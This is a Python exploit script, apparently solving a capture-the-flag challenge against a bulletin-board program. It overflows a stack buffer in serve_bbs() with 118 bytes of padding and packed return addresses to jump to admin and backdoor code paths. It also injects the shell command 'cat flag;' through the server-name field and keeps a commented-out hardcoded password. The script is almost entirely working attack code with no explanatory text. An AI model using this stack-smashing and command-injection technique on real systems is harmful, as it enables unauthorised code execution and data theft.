import interact
import struct

def p64(n):
    return struct.pack("<Q", n)

p = interact.Process()

## Making login_as_admin and flag to true

p.readuntil('Enter choice:')
p.sendline('1')

p.readuntil('Enter post title:')
p.sendline(b'A' * 30)

p.readuntil('contents:')
payload = b'B' * 118 + p64(0x400c57)
p.sendline(payload)

# create_post calls press_enter()
p.readuntil('Press enter to continue...')
p.sendline('')

# View post: this triggers the stack overflow in serve_bbs()
p.readuntil('Enter choice:')
p.sendline('3')

# press_enter() after viewing post
p.readuntil('Press enter to continue...')
p.sendline('')

# make serve_bbs return so overwritten RIP is used
p.readuntil('Enter choice:')
p.sendline('2')

'''
p.readuntil('Enter password to continue:')
p.sendline('l0ln0onewillguessth1s')
'''
p.readuntil('Press enter to continue...')
p.sendline('')

## Making Server Name set
p.readuntil('Enter choice:')
p.sendline('0')
p.readuntil('Enter choice:')
p.sendline('1')
p.readuntil('Enter new server name: ')
p.sendline('cat flag;')
# press_enter() after viewing post
#p.readuntil('Press enter to continue...')
#p.sendline('')

## returning to backdoor

p.readuntil('Enter choice:')
p.sendline('1')
p.readuntil('Enter post title:')
p.sendline(b'A' * 30)


payload = b'B' * 118 + p64(0x400b8a)
p.sendline(payload)



p.readuntil('Press enter to continue...')
p.sendline('')

p.readuntil('Enter choice:')
p.sendline('4')


p.readuntil('Press enter to continue...')
p.sendline('')

p.readuntil('Enter choice:')
p.sendline('2')

'''
p.readuntil('contents:')
payload = b'B' * 118 + p64(0x400ca2)
p.sendline(payload)


p.readuntil('Press enter to continue...')
p.sendline('')

p.readuntil('Enter choice:')
p.sendline('3')

p.readuntil('Press enter to continue...')
p.sendline('')

p.readuntil('Enter choice:')
p.sendline('2')

p.readuntil('Enter choice:')
p.sendline('1')

p.readuntil('Enter new server name: ')
p.sendline('Test')


p.readuntil('Enter choice:')
p.sendline('1')

p.readuntil('Enter post title:')
p.sendline(b'A' * 30)

p.readuntil('contents:')
'''
#p.readuntil('Enter choice:')
#p.sendline('4')



p.interactive()
